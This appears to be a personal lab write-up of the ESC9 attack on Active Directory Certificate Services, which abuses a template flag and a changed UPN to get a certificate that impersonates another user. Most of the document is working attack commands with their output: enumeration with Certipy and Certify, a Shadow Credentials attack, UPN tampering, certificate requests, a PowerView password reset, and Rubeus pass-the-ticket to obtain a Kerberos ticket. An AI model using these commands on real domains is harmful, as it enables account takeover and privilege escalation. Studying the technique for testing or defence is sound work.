This attack a culprit of the *certificate mapping* feature in the CA(Certification Authority). Without getting to much into the technical aspects the certificate mapping involves associating issued certificates with their respective subjects. 
A key aspect to grasp is that if the `msPKI-Enrollment-Flag` attribute of a certificate template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag, it effectively negates the configuration of the `StrongCertificateBindingEnforcement` registry key (even if set to its default value of 1), the mapping process will occur as if the registry key had a value of `0`, essentially bypassing strong certificate mapping.
Consequently, this loophole can be exploited if we possess sufficient privileges to access and modify a user account's `User Principal Name (UPN)`, aligning it with the `UPN` of another account. By leveraging this manipulated configuration, we can request a certificate for the user using their legitimate credentials. Remarkably, the obtained certificate will be seamlessly mapped to the other account, which is the ultimate target.


## Requisites
The basic requisites in order to succeed with a ESC9 type attack vector the following requisites are needed:
1. The `StrongCertificateBindingEnforcement` registry key should not be set to `2` (by default, it is set to `1`), or the `CertificateMappingMethods` should contain the UPN flag (`0x4`). Regrettably, as a low-privileged user, accessing and reading the values of these registry keys is typically unattainable.
2. The certificate template must incorporate the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` value.
3. The certificate template should explicitly specify `client authentication` as its purpose.
4. The attacker must possess at least the `GenericWrite` privilege against any user account (account A) to compromise the security of any other user account (account B).


## Enumeration
To identify potential Templates that can be used to carry an ESC9 type attack we can do:
**Linux:**
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout                
Certipy v4.8.2 - by Oliver Lyak (ly4k)
<SNIP>
Certificate Templates                         
  0 
    Template Name                       : ESC9
    Display Name                        : ESC9
    Certificate Authorities             : lab-LAB-DC-CA        
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False                
    Any Purpose                         : False                
    Enrollee Supplies Subject           : False                
    Certificate Name Flag               : SubjectRequireDirectoryPath                                                                   
                                          SubjectRequireEmail  
                                          SubjectAltRequireEmail 
                                          SubjectAltRequireUpn 
    Enrollment Flag                     : NoSecurityExtension  
                                          AutoEnrollment       
                                          PublishToDs          
                                          IncludeSymmetricAlgorithms                                                                    
    Private Key Flag                    : 16777216                                          
                                          65536                
                                          ExportableKey        
    Extended Key Usage                  : Client Authentication
                                          Secure Email         
                                          Encrypting File System 
    Requires Manager Approval           : False                
    Requires Key Archival               : False                
    Authorized Signatures Required      : 0   
    Validity Period                     : 99 years             
    Renewal Period                      : 6 weeks              
    Minimum RSA Key Length              : 2048
    Permissions    
      Enrollment Permissions                  
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users 
                                          LAB.LOCAL\Enterprise Admins                                                                   
      Object Control Permissions              
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins                                                                   
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins                       
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins                                                                   
                                          LAB.LOCAL\Administrator
    [!] Vulnerabilities                                             
      ESC9                              : 'LAB.LOCAL\\Domain Users' can enroll and template has no security extension 
<SNIP>
```
In this case we can see both that the Template is allowing a *Client Authentication* use and the attribute `Enrollment Flag: NoSecurityExtension`  aka `msPKI-Enrollment-Flag` for the `CT_FLAG_NO_SECURITY_EXTENSION` as well. 

**Windows:**
```
.\Certify.exe find

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=lab,DC=local'

<SNIP>
    CA Name                               : LAB-DC.lab.local\lab-LAB-DC-CA
    Template Name                         : ESC9
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT, NO_SECURITY_EXTENSION
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
```


# Attack Time
The attack vector can be performed on same ways both from a Window or Linux based OS.
## Linux way
We found out already the name of a insecure Template to ESC9 attack which can be used to perform a  *Client Authentication*, *NoSecurityExtension* on the *Enrollment flag* which bypasses the Certificate mapping procedure.
- Start by findind a but we need to finding a valid AD account where our user have a *Generic-Write* permission to write changes and perform **Shadow Credentials** attack..
```
dacledit.py -action read -dc-ip 10.129.205.199 lab.local/blwasp:Password123! -principal blwasp -target user2

Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation
[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-2570265163-3918697770-3667495639-1103)
[*]   ACE[24] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : blwasp (S-1-5-21-2570265163-3918697770-3667495639-1103)
```
- Now we need to retrieve the NTHash of the User2 via *Shadow Credentials attack.*
```
certipy-ad shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
```
- Change *User2* UPN to match another user's UPN example *User3*. This will create a mismatch in the Certificate mapping making the CA point to another user because it reads it from out **tampered UPN**.
```
certipy-ad account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user3@lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Updating user 'user2':
    userPrincipalName                   : user3@lab.local
[*] Successfully updated 'user2'
```
- Now we can enroll a new certificate from **User2 --> User3** which will use the ESC9 *NoSecurity* Enrollment flag and bypass the mapping to impersonate as another user.
```
certipy-ad req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 59
[*] Got certificate with UPN 'user3@lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'user3.pfx'
```
- Let's revert back the UPN of the **User2** to its default value
```
certipy-ad account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Updating user 'user2':
    userPrincipalName                   : user2@lab.local
[*] Successfully updated 'user2'
```
- Lastly, we can authenticate as User3 and perform an impersonation
```
certipy-ad auth -pfx user3.pfx -domain lab.local
```
Use the *ccache* kerberos TGT ticket from the User3 to take your attacks further.
```
export KRB5CCNAME=user3.ccache
impacket-smbclient -k -no-pass LAB-DC.LAB.LOCAL
```

## Windows way
The same attack can be done directly from a Windows machine.
- We are starting by resetting the password of another user where we found out having GenericWrite(**User2**)
```
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity user2 -AccountPassword $((ConvertTo-SecureString 'Newpassword123!' -AsPlainText -Force)) -Verbose
```
- Next, we need to change **Users2** UPN to a third user User3 to create a mismatch in the Certificate mapping feature. 
```
Set-DomainObject user2 -Set @{'userPrincipalName'='user3@lab.local'} -Verbose
```
- Login/RunAs the User2 and proceed with enrolling a new certificate for the UPN **User3**
```
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC9 /altname:user3
```
- Convert the certfiicate from PEM to PFX(you can leave the password field void)
```
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in .\user3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out user3.pfx
```
- Lastly, you can perform an authentication and obtain a valid TGT ticket for the User3 injected into same session
```
.\Rubeus.exe asktgt /user:user3 /certificate:user3.pfx /getcredentials /nowrap /ptt
```
Enjoy the session and use it for other attacks as needed.


## My thoughts
As far as I understand this attack is "less" prone to succeed than the previous attacks as (ESC1, 2, 3) mostly because our attacking user must be allowed to perform a *GenericWrite* over another user and consequently perform a *ShadowCredentials* attack.
